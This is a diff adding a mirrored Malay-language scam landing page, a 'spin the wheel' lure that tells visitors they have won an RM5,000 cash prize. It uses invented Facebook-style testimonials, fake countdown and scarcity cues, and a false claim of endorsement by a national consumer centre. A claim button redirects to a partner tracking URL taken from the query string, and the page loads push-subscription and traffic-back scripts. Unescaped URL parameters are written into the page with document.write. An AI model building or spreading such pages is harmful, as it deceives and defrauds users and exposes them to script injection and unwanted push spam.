@@ -1,0 +1,281 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+  
+<!-- Mirrored from thegiftcenter.xyz/z/prizewheel/cash/aucash/index.html?domain=fastweblink.com&brand=Desktop&cep=xUTQGZahcjtj0_1oRK0xJmablO8_z0mYXmApbPP_7n119tirIiAnGMzOjJ8T39ALRY-LRBTC4M0tCh_VO2KlZXZ-cEA6zrtqZZwf_XvlWv8C__thvlF7vFhe9Vp7oqij8L-SNzNNkLmirTlpHt5FcjAOX8liySE3fTc6662U9lH1GfPBBv278viYUeGXztpkx9Zf6kyxU_tROqm9fh_F02RfIYSw-z3AISQG-eDw3qJtoPP2Hh8ytbkomGbRX1GxZ3p13Kb8ORbc3V-tDYtSdtmDsQtneLrHDRDt4DnIVcNyTm7EbOHZi9KnT376oGINSyVfGleqVwOuRsZbU1s1nixnZs1kvsg7J2br1lGtwCGDcX_apkjBcQGtoPLMOd4ooycmKEJvxssgGoWIBQjBh0cg9EMIJDpHADpDEpxlpg7RjnIMRFcc_NJA0qqhiReLrxmxF-f4pjjvj6GJIMSTt_dmx_D8joKZPPeJqvPtwW73LW4PAnfqjy3OMOQKYZEM&lptoken=160e83c364b1011324b2&pub=23003&pid=23003-7c889c0z&crid=%5B%5Bcreative_id%5D%5D&cost=0&sid=M7231162919889666104&utm_content=ebc5ccdbc1c6c8ad93a3939796a793918abb8bb9d0bfc9bdb2808681b68080858aa6bcbbbe8fbd8d82b2808186f7ebf7eee9f9f0eab2eceffbfef1e3ef97a795ad84878e828acca48c80cee1d4d3e4d7cefbf8f98a8d8998f2f3c1f1c5c1c4f5fdfff8c9cecfcccdf0faf8f8f1f1f1f0e8e2e9e8e6ebeeeac2 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 09 May 2023 13:20:12 GMT -->
+<head>
+    <title>Tahniah</title>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="prizewheel-fb">
+<meta name="description" content="prizewheel-fb">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+    <meta
+      name="alert-message"
+      content="Kami meminta maaf\n\nSila cuba lagi. Anda mempunyai satu lagi peluang!"
+    >
+    <link href="css/app.css?id=2fbe2d9a9a40ca9b2489" type="text/css" rel="stylesheet"/>
+    <link href="css/app8703.css?id=afa7f110a14f461eee6e" type="text/css" rel="stylesheet" />
+<!--     <script>
+function getURLParameter(name) {
+var query = window.location.search.substring(1);
+var vars = query.split("&");
+for (var i=0;i<vars.length;i++) {
+var pair = vars[i].split("=");
+if(pair[0] === name){return decodeURI(pair[1]);}
+}
+return "";
+}
+</script> -->
+<script>
+function getURLParameter(name) { 
+    return decodeURI( 
+    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || '' 
+    ); 
+}
+</script>
+</head>
+  <body
+      >
+    <main id="app" v-cloak>
+      <div class="header">
+        PUTAR & MENANG
+        <img
+          class="header__icon"
+          src="img/notification.png"
+          alt=""
+        />
+      </div>
+      <div class="step" v-if="!hasWon">
+        <div class="card">
+          <div class="step__text">
+            <div class='step__date'>
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+            </div>
+            <h1 class="step__title">              
+			  Tahniah pengguna <script>document.write(getURLParameter('brand'))</script>, anda mempunyai (1) ganjaran belum selesai!!
+            </h1>
+            <div class="step__subtitle">              
+			  Setiap <span class="strong">{{ DateHelper().getDayName() }}</span> kami memilih 10 pengguna bertuah untuk menerima ganjaran.
+            </div>
+          </div>
+          <div class="step__bar">
+            Tuntut Hadiah Anda<br/><em>↓</em> Putar roda <em>↓</em>
+          </div>
+          <vue-prize-wheel
+            class="prize-wheel"
+            static-image="img/prizewheel_static.png"
+            prize-image="img/default@0.5x.png"
+            :start-at="startPrizewheelAt"
+            v-on:lost="retryModalOpen = true"
+            v-on:finish="hasWon = true"
+          >
+            <template v-slot:spinner>
+              <img
+                src="img/prizewheel_spinner.jpg"
+                class="prize-wheel__wheel"
+                alt=""
+              />
+              <img
+                src="img/default%400.5x.png"
+                class="prize-wheel__prize"
+                alt=""
+              />
+            </template>
+          </vue-prize-wheel>
+        </div>
+      </div>
+      <div class="step" v-if="hasWon && !isLoaded">
+        <div class="card step__loader">
+          <img src="img/loader.gif" alt="Loading"/>
+        </div>
+      </div>
+      <div class="step step--end" v-if="isLoaded">
+        <div class="card card--centered">
+          <div class="step__title step__title--bold">
+            Tahniah!
+            Hanya lengkapkan langkah ini untuk menerima Hadiah Tunai RM5,000.00 anda!
+          </div>
+        </div>
+        <div class="card">
+          <div>
+            1. Klik 'Tuntut Hadiah' untuk menuntut hadiah anda. Anda akan diubah hala ke tapak rakan kongsi kami.</div>
+          <div>
+            2. Ikuti langkah di tapak rakan kongsi.
+          </div>
+          <div>
+            <span class="strong">PENTING:</span>
+            Produk mungkin tidak tersedia pada bila-bila masa.
+          </div>
+          <div>Pilih cepat!</div>
+        </div>
+        <div class="card">
+          The offer is valid for next <span><span v-html="countdownMinutes">0</span> minutes and <span v-html="countdownSeconds">0</span> seconds.</span>
+		  Tawaran ini sah untuk <span><span v-html="countdownMinutes">0</span> minit dan <span v-html="countdownSeconds">0</span> saat seterusnya.</span>
+        </div>
+        <div class="card">
+          <div class="step__prize">
+            <div class="step__prize-image">
+              <img
+                src="img/default%400.5x.png"
+                class="step__prize-image-image"
+                alt="$850.00 Cash"
+              />
+              <div>(2) kiri</div>
+            </div>
+            <div class="step__prize-details">
+              <div class="step__title step__title--bold">**Hadiah Wang Tunai RM5,000.00**</div>
+
+              <script>document.write('<a href="https://'+ getURLParameter('domain') + '/click.php?lp=1" class="step__button">Tuntutan Hadiah</a>')</script>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="card">
+          <div class="comments__likes">
+            <span class="comments__link">12,068</span> jumlah suka.
+          </div>
+          <vue-facebook-comment
+            avatar="img/3@0.25x.jpg"
+            name="Adelia Zainal"
+            message="Pada mulanya saya tidak pasti sama ada ini benar atau tidak, tetapi saya telah menerima wang tunai RM5,000.00 hari ini :D!!"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="sekarang"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/4@0.25x.jpg"
+            name="Akmal Yow"
+            message="Adakah sesiapa memenangi sesuatu dalam cabutan bertuah ini??"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="9 minit"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/10@0.25x.jpg"
+            name="Mohamed Affendi"
+            message="Bagaimanakah ia berfungsi? Saya memenangi kad Amazon beberapa tahun yang lalu dan semua percubaan saya selepas itu - tidak berjaya..."
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="32 minit"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/6@0.25x.jpg"
+            name="Zara Yusof"
+            message="Boleh kamu bantu saya? Saya baru sahaja memenangi kad hadiah!! Apa yang patut saya buat sekarang?"
+            :likes="12"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="55 minit"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/9@0.25x.jpg"
+            name="Adam Atilia"
+            message="Hadiah wang tunai RM5000 telah diterima melalui pos hari ini! terima kasih !!."
+            :likes="12"
+            image="img/proof.jpg"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="1 jam"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/5@0.25x.jpg"
+            name="Aishah Xueren"
+            message="Melihat tawaran sekali ini dan mengkliknya kerana saya fikir ia palsu. Saya melihat iklan itu sekali lagi dan kerana saya bosan jadi saya memutuskan untuk mencubanya ... Dan saya mendapat iPhone 11 Pro BAHARU! Apa!!?!"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="3 jam"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/1@0.25x.jpg"
+            name="Irdina Affendi"
+            message="Bagaimanakah ia berfungsi? Saya memenangi kad Amazon beberapa tahun yang lalu dan semua percubaan saya selepas itu - tidak berjaya..."
+            :likes="21"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="3 jam"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/2@0.25x.jpg"
+            name="Amirul Yusof"
+            message="Saya tidak pasti sama ada ia benar atau tidak, tetapi saya menerima kad saya hari ini!! 😍 menakjubkan 🔥 🔥"
+            :likes="1"
+            like-text="Suka"
+            reply-text="Balas"
+            since-text="6 jam"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <p class="card__paragraph comments__link">
+            Lihat 83 komen lama
+          </p>
+        </div>
+        <div class="card">
+          <div class="comments__form">
+            <label for="reply">Tambah balasan:</label>
+            <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+            <p class="card__paragraph">
+              <button onclick="alert('Terima kasih atas ulasan anda, ia akan diterbitkan selepas disemak.');">
+                Hantar
+              </button>
+            </p>
+          </div>
+        </div>
+      </div>
+      <vue-modal :open="welcomeModalOpen" class="modal" v-on:close="welcomeModalOpen = false">
+        <div class="modal__title" style="">MENANG Hadiah Wang Tunai RM5000.00</div>
+        <img
+          class="modal__image"
+          src="img/default%400.5x.png"
+          alt="RM5000.00 Tunai"
+        />
+        <p>
+          <span class="strong">
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+          </span>
+          <br/>
+			Tahniah pengguna <script>document.write(getURLParameter('brand'))</script>!
+          <br/>
+			Pusat Pengguna Nasional ingin mengucapkan terima kasih atas kesetiaan anda.
+          <br/>
+        </p>
+        <p>
+          Putar roda untuk menuntut hadiah istimewa anda 🎁
+          <br>
+          <br>
+          <span class="strong">Semoga berjaya!</span>
+        </p>
+        <button class="modal__button" v-on:click="welcomeModalOpen = false">OK</button>
+      </vue-modal>
+      <vue-modal :open="retryModalOpen" class="modal" v-on:close="retryModalOpen = false">
+        <div class="modal__title" style="">Cuba lagi!</div>
+        <p>
+          *** Anda telah menang satu putaran tambahan ***
+        </p>
+        <button class="modal__button" v-on:click="retryModalOpen = false">OK</button>
+      </vue-modal>
+    </main>
+    <script>window.view = window.view || {};view.offerUrl = "";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script><script>window.view = window.view || {};view.datetimeTranslations = {"ago":":time ago","from_now":":time from now","after":":time after","before":":time before","year":"1 year|:count years","month":"1 month|:count months","week":"1 week|:count weeks","day":"1 day|:count days","hour":"1 hour|:count hours","minute":"1 minute|:count minutes","second":"1 second|:count seconds","january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December","monday":"Monday","tuesday":"Tuesday","wednesday":"Wednesday","thursday":"Thursday","friday":"Friday","saturday":"Saturday","sunday":"Sunday"};</script>    <script src="js/app.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
+        <script
+      src="js/appa2ce.js?id=c1e1d839a41fc2e716b9"
+      type="application/javascript">
+    </script>
+  </body>
+	<script type="text/javascript" src="../../trafficback.js" async></script>   
+	<script type="text/javascript" src="../../pushsubs.js" async></script>
+	<script type="text/javascript" src="../../domain.js" async></script>
+	<!-- <script type="text/javascript" src="../../backunderlink.js" async></script> -->
+	<!-- <script src="https://backunder.com/script.js"></script> -->
+<!-- Mirrored from thegiftcenter.xyz/z/prizewheel/cash/aucash/index.html?domain=fastweblink.com&brand=Desktop&cep=xUTQGZahcjtj0_1oRK0xJmablO8_z0mYXmApbPP_7n119tirIiAnGMzOjJ8T39ALRY-LRBTC4M0tCh_VO2KlZXZ-cEA6zrtqZZwf_XvlWv8C__thvlF7vFhe9Vp7oqij8L-SNzNNkLmirTlpHt5FcjAOX8liySE3fTc6662U9lH1GfPBBv278viYUeGXztpkx9Zf6kyxU_tROqm9fh_F02RfIYSw-z3AISQG-eDw3qJtoPP2Hh8ytbkomGbRX1GxZ3p13Kb8ORbc3V-tDYtSdtmDsQtneLrHDRDt4DnIVcNyTm7EbOHZi9KnT376oGINSyVfGleqVwOuRsZbU1s1nixnZs1kvsg7J2br1lGtwCGDcX_apkjBcQGtoPLMOd4ooycmKEJvxssgGoWIBQjBh0cg9EMIJDpHADpDEpxlpg7RjnIMRFcc_NJA0qqhiReLrxmxF-f4pjjvj6GJIMSTt_dmx_D8joKZPPeJqvPtwW73LW4PAnfqjy3OMOQKYZEM&lptoken=160e83c364b1011324b2&pub=23003&pid=23003-7c889c0z&crid=%5B%5Bcreative_id%5D%5D&cost=0&sid=M7231162919889666104&utm_content=ebc5ccdbc1c6c8ad93a3939796a793918abb8bb9d0bfc9bdb2808681b68080858aa6bcbbbe8fbd8d82b2808186f7ebf7eee9f9f0eab2eceffbfef1e3ef97a795ad84878e828acca48c80cee1d4d3e4d7cefbf8f98a8d8998f2f3c1f1c5c1c4f5fdfff8c9cecfcccdf0faf8f8f1f1f1f0e8e2e9e8e6ebeeeac2 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 09 May 2023 13:20:19 GMT -->
+</html>
